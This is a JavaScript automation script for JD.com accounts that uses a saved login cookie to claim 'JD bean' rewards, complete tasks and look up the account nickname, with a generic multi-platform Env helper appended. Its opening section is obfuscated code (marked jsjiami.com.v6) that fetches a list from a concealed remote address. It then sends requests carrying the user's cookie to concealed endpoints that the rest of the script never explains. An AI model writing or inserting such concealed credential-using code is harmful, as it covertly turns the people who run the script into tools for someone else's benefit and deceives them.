Date(),'headers':{'Host':_0x320f42[_0x84d0('14','vGP]')],'accept':_0x320f42[_0x84d0('15','Y4WG')],'content-type':_0x320f42[_0x84d0('16','2QGg')],'origin':_0x320f42[_0x84d0('17','iE6u')],'accept-language':_0x320f42[_0x84d0('18','Cu6B')],'user-agent':$[_0x84d0('19','xANQ')]()?process[_0x84d0('1a','lkFA')][_0x84d0('1b','flKv')]?process[_0x84d0('1c','mCTn')][_0x84d0('1d','vGP]')]:_0x320f42[_0x84d0('1e','2QGg')](require,_0x320f42[_0x84d0('1f','tvIN')])[_0x84d0('20','flKv')]:$[_0x84d0('21','mCTn')](_0x320f42[_0x84d0('22','Y!NX')])?$[_0x84d0('23','c))w')](_0x320f42[_0x84d0('24','sBs4')]):_0x320f42[_0x84d0('25','*(Td')],'referer':_0x320f42[_0x84d0('26','Y4WG')],'Cookie':cookie},'body':_0x84d0('27','c))w')+_0x446bf9+_0x84d0('28','Cu6B')+_0x1825f1};$[_0x84d0('29','*(Td')](_0x1774bb,(_0x2df07f,_0x3ecbfd,_0x406764)=>{try{if(_0x2df07f){if(_0x320f42[_0x84d0('2a',']7hV')](_0x320f42[_0x84d0('2b','xANQ')],_0x320f42[_0x84d0('2c','#Q6n')])){console[_0x84d0('2d','i3e#')]($[_0x84d0('2e','XHmD')]+_0x84d0('2f','eMX$'));}else{$[_0x84d0('30','YdFv')](e,resp);}}else{if(_0x320f42[_0x84d0('31','iE6u')](_0x320f42[_0x84d0('32','flKv')],_0x320f42[_0x84d0('33','UoI]')])){$[_0x84d0('34','TFeM')](e,resp);}else{_0x406764=JSON[_0x84d0('35',']7hV')](_0x406764);}}}catch(_0x5a25d1){$[_0x84d0('36','i3e#')](_0x5a25d1,resp);}finally{_0x320f42[_0x84d0('37','sBs4')](_0xbbbd10);}});}});}function wuzhi02(_0x36711d){var _0x1140e5={'bScKo':function(_0x3f63ae){return _0x3f63ae();},'fRmAN':function(_0x8a2a63,_0x4074fc){return _0x8a2a63===_0x4074fc;},'QOOKt':_0x84d0('38','TFeM'),'EXzXO':_0x84d0('39','ewy0'),'fSrWa':_0x84d0('3a','5@&h'),'KsZlM':_0x84d0('3b','2QGg'),'Jdwrq':_0x84d0('3c','#Q6n'),'hRGbZ':_0x84d0('3d','tvIN'),'DCdOS':function(_0x417a3f,_0x44f4a9){return _0x417a3f(_0x44f4a9);},'YIKWK':_0x84d0('3e','qSp4'),'SIdNT':_0x84d0('3f','pcRw'),'LikYr':_0x84d0('40','aaQ@')};return new Promise(_0x42aca3=>{var _0x327581={'OSkeI':function(_0x449cc1){return _0x1140e5[_0x84d0('41','Y4WG')](_0x449cc1);},'wckec':function(_0x166bb9,_0x197606){return _0x1140e5[_0x84d0('42','8y^2')](_0x166bb9,_0x197606);},'jltxj':_0x1140e5[_0x84d0('43','%FWi')]};let _0x241846=+new Date();let _0x5b0ed7=_0x36711d[_0x84d0('44','iE6u')];let _0x31e5e7={'url':_0x84d0('45','YdFv')+ +new Date(),'headers':{'Host':_0x1140e5[_0x84d0('46','5@&h')],'accept':_0x1140e5[_0x84d0('47','13l$')],'content-type':_0x1140e5[_0x84d0('48','I4ra')],'origin':_0x1140e5[_0x84d0('49','sK3U')],'accept-language':_0x1140e5[_0x84d0('4a','I4ra')],'user-agent':$[_0x84d0('4b','qSp4')]()?process[_0x84d0('4c','tvIN')][_0x84d0('4d','#Q6n')]?process[_0x84d0('4e','UoI]')][_0x84d0('4f','qSp4')]:_0x1140e5[_0x84d0('50','*(Td')](require,_0x1140e5[_0x84d0('51','%FWi')])[_0x84d0('52','YdFv')]:$[_0x84d0('53','R1lr')](_0x1140e5[_0x84d0('54','ewy0')])?$[_0x84d0('55','qS8G')](_0x1140e5[_0x84d0('56','vGP]')]):_0x1140e5[_0x84d0('57','0q83')],'referer':_0x84d0('58','flKv')+_0x5b0ed7,'Cookie':cookie},'body':_0x84d0('59','(eti')+_0x1140e5[_0x84d0('5a','8y^2')](escape,_0x5b0ed7)+_0x84d0('5b','(V(h')+_0x241846};$[_0x84d0('5c','Cu6B')](_0x31e5e7,(_0x11a45f,_0x539e9e,_0x205812)=>{var _0x531135={'NNDpq':function(_0xc7d251){return _0x327581[_0x84d0('5d','cGq2')](_0xc7d251);}};if(_0x327581[_0x84d0('5e','Cu6B')](_0x327581[_0x84d0('5f','R1lr')],_0x327581[_0x84d0('60','vGP]')])){try{if(_0x11a45f){console[_0x84d0('61','BrmD')]($[_0x84d0('62','eMX$')]+_0x84d0('63','Y4WG'));}else{_0x205812=JSON[_0x84d0('64','iE6u')](_0x205812);}}catch(_0x3e8d28){$[_0x84d0('65','c))w')](_0x3e8d28,resp);}finally{_0x327581[_0x84d0('66','tvIN')](_0x42aca3);}}else{_0x531135[_0x84d0('67','Cu6B')](_0x42aca3);}});});}function shuye72(){var _0x54419f={'DktAn':function(_0x496c1a,_0x306897){return _0x496c1a===_0x306897;},'jVThb':_0x84d0('68','R1lr'),'FHhHg':_0x84d0('69','mCTn'),'XNZzy':function(_0x1fbe24,_0x130e9f){return _0x1fbe24!==_0x130e9f;},'rUFCA':_0x84d0('6a','eMX$'),'wySfN':function(_0x13b5a1,_0x4de24d){return _0x13b5a1<_0x4de24d;},'ZHjlt':function(_0x4e5184,_0x5ef23d){return _0x4e5184(_0x5ef23d);},'LNyAm':function(_0x3b9ba6){return _0x3b9ba6();},'iPHld':function(_0x3a2e90,_0x251f72){return _0x3a2e90===_0x251f72;},'HsAgC':_0x84d0('6b','UoI]'),'DHfqd':_0x84d0('6c','sK3U'),'zSref':_0x84d0('6d','ewy0'),'cjKTG':_0x84d0('6e','&o!6')};return new Promise(_0x41e8cb=>{if(_0x54419f[_0x84d0('6f','iE6u')](_0x54419f[_0x84d0('70','sK3U')],_0x54419f[_0x84d0('71','cGq2')])){data=JSON[_0x84d0('72','aaQ@')](data);}else{$[_0x84d0('73','Y!NX')]({'url':_0x54419f[_0x84d0('74','Os)l')],'headers':{'User-Agent':_0x54419f[_0x84d0('75','nJQ2')]}},async(_0x4fad05,_0x314b94,_0x147826)=>{if(_0x54419f[_0x84d0('76','R1lr')](_0x54419f[_0x84d0('77','qSp4')],_0x54419f[_0x84d0('78','13l$')])){console[_0x84d0('79','&o!6')]($[_0x84d0('7a','Cu6B')]+_0x84d0('7b','mCTn'));}else{try{if(_0x4fad05){console[_0x84d0('7c','#uH!')]($[_0x84d0('7d','vGP]')]+_0x84d0('7e','(eti'));}else{$[_0x84d0('7f','XHmD')]=JSON[_0x84d0('80','BrmD')](_0x147826);if(_0x54419f[_0x84d0('81','I4ra')]($[_0x84d0('82','BvM]')][_0x84d0('83','cGq2')],0x0)){if(_0x54419f[_0x84d0('84','sK3U')](_0x54419f[_0x84d0('85','i3e#')],_0x54419f[_0x84d0('86','TFeM')])){for(let _0x5ac3b4=0x0;_0x54419f[_0x84d0('87','M8[7')](_0x5ac3b4,$[_0x84d0('88','R1lr')][_0x84d0('89','2QGg')][_0x84d0('8a','2QGg')]);_0x5ac3b4++){let _0x8fa4d2=$[_0x84d0('8b','TFeM')][_0x84d0('8c','UoI]')][_0x5ac3b4];await $[_0x84d0('8d','c))w')](0x1f4);_0x54419f[_0x84d0('8e','vGP]')](wuzhi01,_0x8fa4d2);await $[_0x84d0('8f','J6Sx')](0x1f4);_0x54419f[_0x84d0('90','5@&h')](wuzhi02,_0x8fa4d2);}}else{if(_0x4fad05){console[_0x84d0('91','Cu6B')]($[_0x84d0('92','mCTn')]+_0x84d0('93','sBs4'));}else{_0x147826=JSON[_0x84d0('94','0q83')](_0x147826);}}}}}catch(_0x1eff27){$[_0x84d0('95','&o!6')](_0x1eff27,_0x314b94);}finally{_0x54419f[_0x84d0('96','nJQ2')](_0x41e8cb);}}});}});};_0xodu='jsjiami.com.v6';
function showMsg() {
  return new Promise(resolve => {
    $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
    if (message) $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
    resolve()
  })
}

function getTaskList() {
  return new Promise(resolve => {
    const body = {"rnVersion": "4.7", "rnClient": "2", "source": "AppHome"};
    $.post(taskUrl('findBeanHome', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            let beanTask = data.data.floorList.filter(vo => vo.floorName === "种豆得豆定制化场景")[0]
            if (!beanTask.viewed) {
              await receiveTask()
              await $.wait(3000)
            }

            let tasks = data.data.floorList.filter(vo => vo.floorName === "赚京豆")[0]['stageList']
            for (let i = 0; i < tasks.length; ++i) {
              const vo = tasks[i]
              if (vo.viewed) continue
              await receiveTask(vo.stageId, `4_${vo.stageId}`)
              await $.wait(3000)
            }
            await award()
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function receiveTask(itemId = "zddd", type = "3") {
  return new Promise(resolve => {
    const body = {"awardFlag": false, "itemId": itemId, "source": "home", "type": type};
    $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data) {
              console.log(`完成任务成功，进度${data.data.taskProgress}/${data.data.taskThreshold}`)
            } else {
              console.log(`完成任务失败，${data.errorMessage}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}


function award(source="home") {
  return new Promise(resolve => {
    const body = {"awardFlag": true, "source": source};
    $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data) {
              console.log(`领奖成功，获得 ${data.data.beanNum} 个京豆`)
              message += `领奖成功，获得 ${data.data.beanNum} 个京豆\n`
            } else {
              console.log(`领奖失败，${data.errorMessage}`)
              // message += `领奖失败，${data.errorMessage}\n`
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function receiveJd2() {
  var headers = {
    'Host': 'api.m.jd.com',
    'content-type': 'application/x-www-form-urlencoded',
    'accept': '*/*',
    'user-agent': 'JD4iPhone/167515 (iPhone; iOS 14.2; Scale/3.00)',
    'accept-language': 'zh-Hans-JP;q=1, en-JP;q=0.9, zh-Hant-TW;q=0.8, ja-JP;q=0.7, en-US;q=0.6',
    'Cookie': cookie
  };
  var dataString = 'body=%7B%7D&build=167576&client=apple&clientVersion=9.4.3&openudid=53f4d9c70c1c81f1c8769d2fe2fef0190a3f60d2&osVersion=14.2&partner=TF&rfs=0000&scope=10&screen=1242%2A2208&sign=19c33b5b9ad4f02c53b6040fc8527119&st=1614701322170&sv=122'
  var options = {
    url: 'https://api.m.jd.com/client.action?functionId=sceneInitialize',
    headers: headers,
    body: dataString
  };
  return new Promise(resolve => {
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['code'] === '0' && data['data']) {
              console.log(`强制开启新版领京豆成功,获得${data['data']['sceneLevelConfig']['beanNum']}京豆\n`);
              $.msg($.name, '', `强制开启新版领京豆成功\n获得${data['data']['sceneLevelConfig']['beanNum']}京豆`);
            } else {
              console.log(`强制开启新版领京豆结果:${JSON.stringify(data)}\n`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function taskGetUrl(function_id, body) {
  return {
    url: `${JD_API_HOST}client.action?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&clientVersion=9.2.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded"
    }
  }
}


function taskUrl(function_id, body) {
  body["version"] = "9.0.0.1";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=5_274_49707_49973&build=167283&clientVersion=9.1.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded"
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}